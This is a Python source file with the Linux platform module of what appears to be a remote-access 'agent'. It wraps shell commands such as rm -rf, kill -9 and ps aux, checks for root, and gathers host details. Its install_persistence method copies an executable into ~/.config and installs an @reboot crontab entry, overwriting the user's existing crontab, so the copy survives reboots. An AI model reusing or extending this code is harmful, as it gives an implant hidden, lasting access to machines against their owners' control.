import os
import subprocess
import shutil
import sys

from agent.platform.base import AbstractPlatform


class LinuxPlatform(AbstractPlatform):

    def list_dir_cmd(self, path=None):
        return f'ls -la "{path}"' if path else 'ls -la'

    def current_dir_cmd(self):
        return 'pwd'

    def delete_cmd(self, path, recursive=False):
        if recursive:
            return f'rm -rf "{path}"'
        return f'rm -f "{path}"'

    def move_cmd(self, src, dst):
        return f'mv "{src}" "{dst}"'

    def read_file_cmd(self, path):
        return f'cat "{path}"'

    def touch_cmd(self, path):
        return f'touch "{path}"'

    def process_list_cmd(self):
        return 'ps aux'

    def kill_process_cmd(self, pid):
        return f'kill -9 {pid}'

    def network_info_cmd(self):
        return 'ifconfig'

    def install_persistence(self, reg_name, copy_name):
        try:
            agent_path = os.path.expanduser(f'~/.config/{copy_name}')
            if not os.path.exists(agent_path):
                shutil.copyfile(sys.executable, agent_path)
            cron_line = f'@reboot {sys.executable} ~/.config/{copy_name}\n'
            cron_path = os.path.expanduser('~/.config/crontab_entry')
            with open(cron_path, 'w') as f:
                f.write(cron_line)
            subprocess.call(f'crontab {cron_path}', shell=True)
            os.remove(cron_path)
            return f'[+] Created Persistence via crontab'
        except Exception as e:
            return f'[-] Persistence error: {e}'

    def get_appdata_path(self):
        return os.path.expanduser('~/.config')

    def check_admin(self):
        return '[+] Root' if os.geteuid() == 0 else '[-] Not root'

    def get_system_user(self):
        try:
            return os.getlogin()
        except Exception:
            return os.environ.get('USER', 'Unknown')

    def get_memory_info(self):
        try:
            with open('/proc/meminfo', 'r') as f:
                for line in f:
                    if line.startswith('MemTotal:'):
                        kb = int(line.split()[1])
                        gb = round(kb / (1024 ** 2), 2)
                        return f"Total RAM: {gb} GB"
        except Exception:
            pass
        return None

    def grep_cmd(self, pattern):
        return f'grep "{pattern}"'

    def clear_screen_cmd(self):
        return 'clear'
